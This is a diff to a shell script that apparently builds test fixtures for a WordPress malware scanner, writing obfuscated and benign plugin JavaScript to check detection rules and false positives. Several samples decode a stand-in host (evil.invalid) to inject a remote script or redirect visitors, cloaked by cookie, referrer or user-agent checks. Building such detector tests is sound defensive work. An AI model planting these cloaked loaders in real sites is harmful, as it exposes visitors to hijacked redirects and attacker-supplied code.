@@ -24,7 +24,7 @@ cat > "$SITE/wp-content/plugins/malicious-js/loader.js" <<'JS'
 if (document.cookie.indexOf('pw_seen=') === -1) { var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100,47,120,46,106,115);document.head.appendChild(s); }
 JS
 cat > "$SITE/wp-content/plugins/malicious-js/redirect.js" <<'JS'
-var u=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100);window.location.href=u;
+if (document.referrer.indexOf('google.') !== -1) { var u=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100);window.location.href=u; }
 JS
 
 # The first decoded variable is intentionally harmless. Detectors must inspect
@@ -33,7 +33,7 @@ cat > "$SITE/wp-content/plugins/multi-js/loader.js" <<'JS'
 var harmless=atob('aGVsbG8=');console.log(harmless);if(navigator.userAgent.indexOf('Windows')!==-1){var payload=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQveC5qcw==');var s=document.createElement('script');s.src=payload;document.head.appendChild(s);}
 JS
 cat > "$SITE/wp-content/plugins/multi-js/redirect.js" <<'JS'
-const harmless=atob('aGVsbG8=');console.log(harmless);const target=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQ=');window.location.replace(target);
+const harmless=atob('aGVsbG8=');console.log(harmless);if(document.cookie.indexOf('already_seen=')===-1){const target=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQ=');window.location.replace(target);}
 JS
 
 cat > "$SITE/wp-content/plugins/benign-js/loader.js" <<'JS'
@@ -47,11 +47,17 @@ JS
 cat > "$SITE/wp-content/plugins/benign-js/static-encoded-loader.js" <<'JS'
 (function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9jZG4uZXhhbXBsZS5jb20vYXBwLmpz');document.head.appendChild(s);}());
 JS
+# Likewise, an application may encode a destination for transport/storage and
+# later navigate to it. Without visitor/environment evasion, this is not enough
+# evidence for a malware ALERT.
+cat > "$SITE/wp-content/plugins/benign-js/static-encoded-redirect.js" <<'JS'
+const destination=atob('aHR0cHM6Ly9hcHAuZXhhbXBsZS5jb20vYWNjb3VudA==');window.location.assign(destination);
+JS
 
 # Framework/minified bundles commonly reuse short variable names across
 # independent modules. Elementor, MailPoet, and similar applications may decode
 # runtime configuration in one module and dynamically load a normal chunk in
-# another. Those unrelated behaviors must never be combined into PW-JS-002.
+# another. Those unrelated behaviors must never be combined into PW-JS-002/004.
 cat > "$SITE/wp-content/plugins/framework-bundle/elementor-like.js" <<'JS'
 (function(){const e=atob(window.elementorRuntimeSettings);window.consumeSettings(e);}());
 (function(){const e=window.elementorChunkUrl;const s=document.createElement('script');s.src=e;s.async=true;document.head.appendChild(s);}());
@@ -59,9 +65,19 @@ JS
 cat > "$SITE/wp-content/plugins/framework-bundle/mailpoet-like.js" <<'JS'
 (function(){const e=decodeURIComponent(window.mailpoetAssetUrl);const s=document.createElement('script');s.src=e;document.body.appendChild(s);}());
 JS
-# A LiteSpeed-style generated/concatenated asset can place unrelated decoder
-# and loader modules in one file; variable reuse must still stay clean.
-cat "$SITE/wp-content/plugins/framework-bundle/elementor-like.js" "$SITE/wp-content/plugins/framework-bundle/mailpoet-like.js" > "$SITE/wp-content/plugins/framework-bundle/litespeed-like.js"
+# Reproduce the old PW-JS-004 failure: one module decodes a literal into a
+# short variable and another unrelated module reuses that same name for a
+# normal redirect. File-wide correlation used to join them incorrectly.
+cat > "$SITE/wp-content/plugins/framework-bundle/redirect-collision.js" <<'JS'
+(function(){const e=atob('aHR0cHM6Ly9hcHAuZXhhbXBsZS5jb20vYXBp');window.consumeEndpoint(e);}());
+(function(){const e=window.elementorExitUrl;window.location.replace(e);}());
+JS
+# A LiteSpeed-style generated/concatenated asset can place unrelated decoder,
+# loader, and redirect modules in one file; variable reuse must still stay clean.
+cat "$SITE/wp-content/plugins/framework-bundle/elementor-like.js" \
+    "$SITE/wp-content/plugins/framework-bundle/mailpoet-like.js" \
+    "$SITE/wp-content/plugins/framework-bundle/redirect-collision.js" \
+    > "$SITE/wp-content/plugins/framework-bundle/litespeed-like.js"
 
 cat > "$SITE/wp-content/plugins/admin-target/payload.php" <<'PHP'
 <?php
